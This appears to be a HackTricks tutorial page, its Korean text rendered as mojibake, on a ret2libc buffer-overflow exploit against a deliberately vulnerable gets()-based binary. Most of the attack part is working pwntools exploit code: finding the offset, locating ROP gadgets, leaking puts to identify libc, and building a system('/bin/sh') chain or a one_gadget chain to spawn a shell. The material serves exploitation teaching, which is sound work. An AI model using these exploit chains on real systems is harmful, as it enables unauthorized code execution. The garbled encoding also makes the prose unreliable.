<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>


# ë¹ ë¥¸ ìš”ì•½

1. **ì˜¤ë²„í”Œë¡œìš° ì˜¤í”„ì…‹** ì°¾ê¸°
2. `POP_RDI`, `PUTS_PLT`, `MAIN_PLT` ê°€ì ¯ ì°¾ê¸°
3. ì´ì „ ê°€ì ¯ì„ ì‚¬ìš©í•˜ì—¬ puts ë˜ëŠ” ë‹¤ë¥¸ libc í•¨ìˆ˜ì˜ ë©”ëª¨ë¦¬ ì£¼ì†Œë¥¼ **ìœ ì¶œ**í•˜ê³  libc ë²„ì „ì„ **ì°¾ê¸°** ([ë‹¤ìš´ë¡œë“œ](https://libc.blukat.me))
4. ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ROPë¥¼ ê³„ì‚°í•˜ê³  ì´ë¥¼ ì´ìš©í•˜ì—¬ ì·¨ì•½ì ì„ **ì´ìš©**í•˜ê¸°

# ë‹¤ë¥¸ íŠœí† ë¦¬ì–¼ ë° ì—°ìŠµìš© ì´ì§„ íŒŒì¼

ì´ íŠœí† ë¦¬ì–¼ì€ ë‹¤ìŒ íŠœí† ë¦¬ì–¼ì—ì„œ ì œì•ˆëœ ì½”ë“œ/ë°”ì´ë„ˆë¦¬ë¥¼ ì´ìš©í•©ë‹ˆë‹¤: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
ë‹¤ë¥¸ ìœ ìš©í•œ íŠœí† ë¦¬ì–¼: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

# ì½”ë“œ

íŒŒì¼ëª…: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector  -no-pie
```
# ROP - LIBC ì£¼ì†Œ ë…¸ì¶œ í…œí”Œë¦¿

ì´ ì½”ë“œë¥¼ ì‚¬ìš©í•˜ì—¬ exploitì„ ë§Œë“¤ ê²ƒì…ë‹ˆë‹¤.\
exploitì„ ë‹¤ìš´ë¡œë“œí•˜ê³  ì·¨ì•½í•œ ì´ì§„ íŒŒì¼ê³¼ ë™ì¼í•œ ë””ë ‰í† ë¦¬ì— ë„£ê³  ìŠ¤í¬ë¦½íŠ¸ì— í•„ìš”í•œ ë°ì´í„°ë¥¼ ì œê³µí•˜ì„¸ìš”:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# 1- ì˜¤í”„ì…‹ ì°¾ê¸°

í…œí”Œë¦¿ì€ exploitì„ ê³„ì†í•˜ê¸° ì „ì— ì˜¤í”„ì…‹ì´ í•„ìš”í•©ë‹ˆë‹¤. ì œê³µëœ ì˜¤í”„ì…‹ì´ ì—†ìœ¼ë©´ í•„ìš”í•œ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì—¬ ì°¾ì„ ê²ƒì…ë‹ˆë‹¤ (ê¸°ë³¸ê°’ì€ `OFFSET = ""`ì…ë‹ˆë‹¤).
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**ì‹¤í–‰** `python template.py`ë¥¼ ì…ë ¥í•˜ë©´ í”„ë¡œê·¸ë¨ì´ ì¶©ëŒí•œ ìƒíƒœë¡œ GDB ì½˜ì†”ì´ ì—´ë¦½ë‹ˆë‹¤. ê·¸ **GDB ì½˜ì†”**ì—ì„œ `x/wx $rsp`ë¥¼ ì‹¤í–‰í•˜ì—¬ RIPë¥¼ ë®ì–´ì“¸ **ë°”ì´íŠ¸**ë¥¼ ì–»ìŠµë‹ˆë‹¤. ë§ˆì§€ë§‰ìœ¼ë¡œ **íŒŒì´ì¬** ì½˜ì†”ì„ ì‚¬ìš©í•˜ì—¬ **ì˜¤í”„ì…‹**ì„ ì–»ìŠµë‹ˆë‹¤:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../.gitbook/assets/image (140).png>)

ì˜¤í”„ì…‹ì„ ì°¾ì€ í›„ (ì´ ê²½ìš°ì—ëŠ” 40) í•´ë‹¹ ê°’ì„ ì‚¬ìš©í•˜ì—¬ í…œí”Œë¦¿ ë‚´ì˜ OFFSET ë³€ìˆ˜ë¥¼ ë³€ê²½í•©ë‹ˆë‹¤.\
`OFFSET = "A" * 40`

ë‹¤ë¥¸ ë°©ë²•ì€ `pattern create 1000` -- _execute until ret_ -- `pattern seach $rsp`ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

# 2- ê°€ì ¯ ì°¾ê¸°

ì´ì œ ì´ì§„ íŒŒì¼ ë‚´ì—ì„œ ROP ê°€ì ¯ì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤. ì´ ROP ê°€ì ¯ì€ **libc**ë¥¼ ì°¾ê¸° ìœ„í•´ `puts`ë¥¼ í˜¸ì¶œí•˜ëŠ” ë° ìœ ìš©í•˜ë©°, ë‚˜ì¤‘ì— **ìµœì¢… ê³µê²©ì„ ì‹¤í–‰**í•˜ëŠ” ë° ì‚¬ìš©ë  ê²ƒì…ë‹ˆë‹¤.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
`PUTS_PLT`ëŠ” **í•¨ìˆ˜ puts**ë¥¼ í˜¸ì¶œí•˜ê¸° ìœ„í•´ í•„ìš”í•©ë‹ˆë‹¤.\
`MAIN_PLT`ëŠ” **ë©”ì¸ í•¨ìˆ˜**ë¥¼ í˜¸ì¶œí•˜ê¸° ìœ„í•´ í•„ìš”í•©ë‹ˆë‹¤. í•˜ë‚˜ì˜ ìƒí˜¸ì‘ìš© í›„ì— **ë‹¤ì‹œ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ì´ìš©í•˜ì—¬** **exploit**ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤ (ë¬´í•œí•œ exploit ë¼ìš´ë“œ). **ê° ROPì˜ ëì—ì„œ í”„ë¡œê·¸ë¨ì„ ë‹¤ì‹œ í˜¸ì¶œí•˜ê¸° ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤**.\
**POP\_RDI**ëŠ” í˜¸ì¶œëœ í•¨ìˆ˜ì— **ë§¤ê°œë³€ìˆ˜**ë¥¼ **ì „ë‹¬**í•˜ê¸° ìœ„í•´ í•„ìš”í•©ë‹ˆë‹¤.

ì´ ë‹¨ê³„ì—ì„œëŠ” ì‹¤í–‰ ì¤‘ì— pwntoolsê°€ ëª¨ë“  ê²ƒì„ ì°¾ê¸° ë•Œë¬¸ì— ì•„ë¬´ê²ƒë„ ì‹¤í–‰í•  í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤.

# 3- LIBC ë¼ì´ë¸ŒëŸ¬ë¦¬ ì°¾ê¸°

ì´ì œ ì‚¬ìš© ì¤‘ì¸ **libc** ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ ë²„ì „ì„ ì°¾ì„ ì‹œê°„ì…ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ ìš°ë¦¬ëŠ” ë©”ëª¨ë¦¬ì˜ **í•¨ìˆ˜** `puts`ì˜ **ì£¼ì†Œ**ë¥¼ **leak**í•œ ë‹¤ìŒ í•´ë‹¹ ì£¼ì†Œì— ìˆëŠ” puts ë²„ì „ì´ ìˆëŠ” **ë¼ì´ë¸ŒëŸ¬ë¦¬ ë²„ì „**ì„ **ê²€ìƒ‰**í•  ê²ƒì…ë‹ˆë‹¤.
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
ì´ë¥¼ ìœ„í•´ ì‹¤í–‰ëœ ì½”ë“œì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ ì¤„ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
ì´ë ‡ê²Œ í•˜ë©´ **RIP**ë¥¼ ë®ì–´ì“°ê¸° ê°€ëŠ¥í•œ ë°”ì´íŠ¸ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤: `OFFSET`.\
ê·¸ëŸ° ë‹¤ìŒ, ê°€ì ¯ `POP_RDI`ì˜ **ì£¼ì†Œ**ë¥¼ ì„¤ì •í•˜ì—¬ ë‹¤ìŒ ì£¼ì†Œ(`FUNC_GOT`)ê°€ **RDI** ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— ì €ì¥ë©ë‹ˆë‹¤. ì´ëŠ” `PUTS_GOT`ì˜ ì£¼ì†Œë¥¼ ë©”ëª¨ë¦¬ì˜ puts í•¨ìˆ˜ ì£¼ì†Œê°€ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œì— ì €ì¥í•˜ê¸° ìœ„í•¨ì…ë‹ˆë‹¤.\
ê·¸ í›„ì—ëŠ” `PUTS_PLT`ê°€ í˜¸ì¶œë©ë‹ˆë‹¤(`RDI` ë‚´ë¶€ì— `PUTS_GOT`ì´ ìˆìŒ). ë”°ë¼ì„œ putsëŠ” `PUTS_GOT` ë‚´ë¶€ì˜ ë‚´ìš©(ë©”ëª¨ë¦¬ì˜ puts í•¨ìˆ˜ ì£¼ì†Œ)ì„ ì½ê³  ì¶œë ¥í•©ë‹ˆë‹¤.\
ë§ˆì§€ë§‰ìœ¼ë¡œ, **main í•¨ìˆ˜ê°€ ë‹¤ì‹œ í˜¸ì¶œ**ë˜ë¯€ë¡œ ìš°ë¦¬ëŠ” ì˜¤ë²„í”Œë¡œìš°ë¥¼ ë‹¤ì‹œ ì´ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ë ‡ê²Œ í•˜ë©´ puts í•¨ìˆ˜ë¥¼ ì†ì—¬ì„œ **ë©”ëª¨ë¦¬**ì— ìˆëŠ” puts í•¨ìˆ˜ì˜ **ì£¼ì†Œ**ë¥¼ ì¶œë ¥í•˜ê²Œ ë§Œë“¤ì—ˆìŠµë‹ˆë‹¤(ì´ëŠ” **libc** ë¼ì´ë¸ŒëŸ¬ë¦¬ ë‚´ì— ìˆìŠµë‹ˆë‹¤). ì´ì œ í•´ë‹¹ ì£¼ì†Œë¥¼ ì‚¬ìš©í•˜ì—¬ ì–´ë–¤ libc ë²„ì „ì„ ì‚¬ìš©í•˜ëŠ”ì§€ **ê²€ìƒ‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](<../../../.gitbook/assets/image (141).png>)

ë¡œì»¬ ë°”ì´ë„ˆë¦¬ë¥¼ **exploit**í•˜ëŠ” ê²½ìš° **libc** ë²„ì „ì„ ì°¾ì„ í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤(`/lib/x86_64-linux-gnu/libc.so.6`ì—ì„œ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì°¾ê¸°ë§Œ í•˜ë©´ ë©ë‹ˆë‹¤).\
í•˜ì§€ë§Œ ì›ê²© exploitì˜ ê²½ìš° ì—¬ê¸°ì„œ ì–´ë–»ê²Œ ì°¾ì„ ìˆ˜ ìˆëŠ”ì§€ ì„¤ëª…í•˜ê² ìŠµë‹ˆë‹¤:

## 3.1- libc ë²„ì „ ê²€ìƒ‰ (1)

ì›¹ í˜ì´ì§€ [https://libc.blukat.me/](https://libc.blukat.me)ì—ì„œ ì‚¬ìš© ì¤‘ì¸ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë˜í•œ ê²€ìƒ‰ëœ **libc** ë²„ì „ì„ ë‹¤ìš´ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](<../../../.gitbook/assets/image (142).png>)

## 3.2- libc ë²„ì „ ê²€ìƒ‰ (2)

ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

ì´ ì‘ì—…ì€ ì‹œê°„ì´ ê±¸ë¦´ ìˆ˜ ìˆìœ¼ë‹ˆ ê¸°ë‹¤ë ¤ì£¼ì‹­ì‹œì˜¤.\
ì´ ì‘ì—…ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ í•„ìš”í•œ ê²ƒì€:

* Libc ì‹¬ë³¼ ì´ë¦„: `puts`
* ëˆ„ì¶œëœ libc ì£¼ì†Œ: `0x7ff629878690`

ê°€ëŠ¥ì„±ì´ ê°€ì¥ ë†’ì€ **libc**ë¥¼ ì•Œì•„ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
ìš°ë¦¬ëŠ” 2ê°œì˜ ì¼ì¹˜ í•­ëª©ì„ ì–»ìŠµë‹ˆë‹¤ (ì²« ë²ˆì§¸ í•­ëª©ì´ ì‘ë™í•˜ì§€ ì•Šìœ¼ë©´ ë‘ ë²ˆì§¸ í•­ëª©ì„ ì‹œë„í•´ ë³´ì„¸ìš”). ì²« ë²ˆì§¸ í•­ëª©ì„ ë‹¤ìš´ë¡œë“œí•˜ì„¸ìš”:
```
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
`libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` íŒŒì¼ì„ ì‘ì—… ë””ë ‰í† ë¦¬ë¡œ ë³µì‚¬í•©ë‹ˆë‹¤.

## 3.3- ë¼ì´ë¸ŒëŸ¬ë¦¬ ì£¼ì†Œ ë…¸ì¶œì„ ìœ„í•œ ë‹¤ë¥¸ í•¨ìˆ˜ë“¤
```python
puts
printf
__libc_start_main
read
gets
```
# 4- ê¸°ë°˜ libc ì£¼ì†Œ ì°¾ê¸° ë° ì´ìš©í•˜ê¸°

ì´ ì‹œì ì—ì„œ ìš°ë¦¬ëŠ” ì‚¬ìš©ë˜ëŠ” libc ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤. ë¡œì»¬ ë°”ì´ë„ˆë¦¬ë¥¼ ê³µê²©í•˜ê³  ìˆìœ¼ë¯€ë¡œ, ë‹¨ìˆœíˆ `/lib/x86_64-linux-gnu/libc.so.6`ë¥¼ ì‚¬ìš©í•˜ê² ìŠµë‹ˆë‹¤.

ê·¸ë˜ì„œ, `template.py`ì˜ ì‹œì‘ ë¶€ë¶„ì—ì„œ **libc** ë³€ìˆ˜ë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ë³€ê²½í•˜ì‹­ì‹œì˜¤: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it`

**libc ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ ê²½ë¡œ**ë¥¼ ì œê³µí•˜ë©´, **ë‚˜ë¨¸ì§€ ê³µê²©ì€ ìë™ìœ¼ë¡œ ê³„ì‚°**ë©ë‹ˆë‹¤.

`get_addr` í•¨ìˆ˜ ë‚´ì—ì„œ **libcì˜ ê¸°ë°˜ ì£¼ì†Œ**ê°€ ê³„ì‚°ë©ë‹ˆë‹¤:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
ì£¼ì˜: **ìµœì¢… libc ê¸°ë³¸ ì£¼ì†ŒëŠ” 00ìœ¼ë¡œ ëë‚˜ì•¼ í•©ë‹ˆë‹¤**. ê·¸ë ‡ì§€ ì•Šì€ ê²½ìš° ì˜ëª»ëœ ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ ìœ ì¶œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

ê·¸ëŸ° ë‹¤ìŒ, `system` í•¨ìˆ˜ì˜ ì£¼ì†Œì™€ ë¬¸ìì—´ _"/bin/sh"_ ì˜ **ì£¼ì†Œ**ëŠ” **libc**ì˜ **ê¸°ë³¸ ì£¼ì†Œ**ì™€ **libc ë¼ì´ë¸ŒëŸ¬ë¦¬**ì—ì„œ **ê³„ì‚°**ë©ë‹ˆë‹¤.
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
ë§ˆì¹¨ë‚´, /bin/sh ì‹¤í–‰ exploitì´ ì¤€ë¹„ë˜ì–´ ì „ì†¡ë  ê²ƒì…ë‹ˆë‹¤:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
ì´ ë§ˆì§€ë§‰ ROPë¥¼ ì„¤ëª…í•´ë³´ê² ìŠµë‹ˆë‹¤. 
ë§ˆì§€ë§‰ ROP(rop1)ì€ ë‹¤ì‹œ main í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³ , ê·¸ë˜ì„œ ìš°ë¦¬ëŠ” ì˜¤ë²„í”Œë¡œìš°ë¥¼ ë‹¤ì‹œ ì´ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ê·¸ë˜ì„œ `OFFSET`ì´ ë‹¤ì‹œ ë‚˜íƒ€ë‚©ë‹ˆë‹¤). ê·¸ëŸ° ë‹¤ìŒ, `POP_RDI`ë¥¼ í˜¸ì¶œí•˜ì—¬ _"/bin/sh"ì˜ ì£¼ì†Œ(BINSH)ë¥¼ ê°€ë¦¬í‚¤ê³ , _"/bin/sh"ì˜ ì£¼ì†Œê°€ ë§¤ê°œë³€ìˆ˜ë¡œ ì „ë‹¬ë˜ê¸° ë•Œë¬¸ì— **system** í•¨ìˆ˜(SYSTEM)ë¥¼ í˜¸ì¶œí•˜ë ¤ê³  í•©ë‹ˆë‹¤. 
ë§ˆì§€ë§‰ìœ¼ë¡œ, **exit í•¨ìˆ˜ì˜ ì£¼ì†Œ**ë¥¼ í˜¸ì¶œí•˜ì—¬ í”„ë¡œì„¸ìŠ¤ê°€ ì •ìƒì ìœ¼ë¡œ ì¢…ë£Œë˜ê³  ì–´ë–¤ ê²½ê³ ë„ ë°œìƒí•˜ì§€ ì•Šë„ë¡ í•©ë‹ˆë‹¤.

**ì´ë ‡ê²Œ í•˜ë©´ exploitì´ _/bin/sh ì‰˜ì„ ì‹¤í–‰**í•  ê²ƒì…ë‹ˆë‹¤.

![](<../../../.gitbook/assets/image (143).png>)

# 4(2)- ONE_GADGET ì‚¬ìš©í•˜ê¸°

**system**ê³¼ **"/bin/sh"** ëŒ€ì‹ ì— **ONE_GADGET**ì„ ì‚¬ìš©í•˜ì—¬ ì‰˜ì„ ì–»ì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. **ONE_GADGET**ì€ libc ë¼ì´ë¸ŒëŸ¬ë¦¬ ë‚´ì—ì„œ í•˜ë‚˜ì˜ **ROP ì£¼ì†Œ**ë§Œ ì‚¬ìš©í•˜ì—¬ ì‰˜ì„ ì–»ëŠ” ë°©ë²•ì„ ì°¾ì•„ì¤ë‹ˆë‹¤. 
í•˜ì§€ë§Œ, ì¼ë°˜ì ìœ¼ë¡œ ëª‡ ê°€ì§€ ì œì•½ ì¡°ê±´ì´ ìˆìŠµë‹ˆë‹¤. ê°€ì¥ ì¼ë°˜ì ì´ê³  í”¼í•  ìˆ˜ ìˆëŠ” ì œì•½ ì¡°ê±´ì€ `[rsp+0x30] == NULL`ê³¼ ê°™ì€ ê²ƒì…ë‹ˆë‹¤. **RSP** ë‚´ë¶€ì˜ ê°’ì„ ì œì–´í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ, ì¶”ê°€ì ì¸ NULL ê°’ì„ ë³´ë‚´ì„œ ì œì•½ ì¡°ê±´ì„ í”¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](<../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
# EXPLOIT íŒŒì¼

ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•œ í…œí”Œë¦¿ì„ ë‹¤ìŒì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# ì¼ë°˜ì ì¸ ë¬¸ì œ

## MAIN\_PLT = elf.symbols\['main']ì„ ì°¾ì„ ìˆ˜ ì—†ìŒ

"main" ì‹¬ë³¼ì´ ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ê²½ìš°, main ì½”ë“œê°€ ìˆëŠ” ê³³ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
ê·¸ë¦¬ê³  ì£¼ì†Œë¥¼ ìˆ˜ë™ìœ¼ë¡œ ì„¤ì •í•˜ì„¸ìš”:
```python
MAIN_PLT = 0x401080
```
## Putsë¥¼ ì°¾ì„ ìˆ˜ ì—†ìŒ

ë°”ì´ë„ˆë¦¬ê°€ Putsë¥¼ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ê²½ìš° ë‹¤ìŒì„ í™•ì¸í•´ì•¼í•©ë‹ˆë‹¤.

## `sh: 1: %s%s%s%s%s%s%s%s: not found`

ëª¨ë“  exploitì„ ìƒì„±í•œ í›„ì— ì´ **ì˜¤ë¥˜**ë¥¼ ë°œê²¬í•˜ë©´ `sh: 1: %s%s%s%s%s%s%s%s: not found` ë‹¤ìŒì„ ì‹œë„í•˜ì‹­ì‹œì˜¤.

"/bin/sh"ì˜ ì£¼ì†Œì—ì„œ **64ë°”ì´íŠ¸ë¥¼ ë¹¼ë³´ì„¸ìš”**.
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>
